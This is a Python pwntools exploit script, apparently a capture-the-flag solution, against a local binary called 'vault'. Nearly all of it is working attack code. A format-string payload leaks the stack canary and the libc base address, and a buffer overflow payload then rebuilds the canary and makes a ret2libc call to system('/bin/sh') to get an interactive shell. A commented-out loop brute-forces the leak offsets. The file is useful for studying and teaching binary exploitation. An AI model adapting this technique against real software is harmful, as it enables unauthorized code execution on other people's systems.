from pwn import *

elf = context.binary = ELF('./vault_patched',checksec=False)
libc = ELF('./libc.so.6',checksec=False)
context.log_level = 'debug'

#for i in range(50):
#    io = process()
#    payload = f'AAAA%{i}$p'.encode()
#    io.sendlineafter(b'> ',b'1')
#    io.sendlineafter(b'What do you want to put in your vault? ',payload)
#    io.sendlineafter(b'> ',b'2')
#    leak = io.recvline()
#    io.sendlineafter(b'> ',b'3')
#    print(leak,i)


io = process()
payload = b'%23$p %24$p'
io.sendlineafter(b'> ',b'1')
io.sendlineafter(b'What do you want to put in your vault? ',payload)
io.sendlineafter(b'> ',b'2')
io.recvuntil(b'ur stuff: ')
leak = io.recvline(keepends=False).split(b' ')
canary = int(leak[0],16)
libc.address = int(leak[1],16) - 0x22d5c0
print(leak)
print(hex(canary))
print(hex(libc.address))

payload = b'A'*64
payload += pack(canary)
payload += b'B'*12
payload += pack(libc.sym.system)
payload += pack(0x0)
payload += pack(next(libc.search(b'/bin/sh\x00')))

io.sendlineafter(b'> ',b'1')
io.sendlineafter(b'What do you want to put in your vault? ',payload)
io.sendlineafter(b'> ',b'3')
io.interactive()
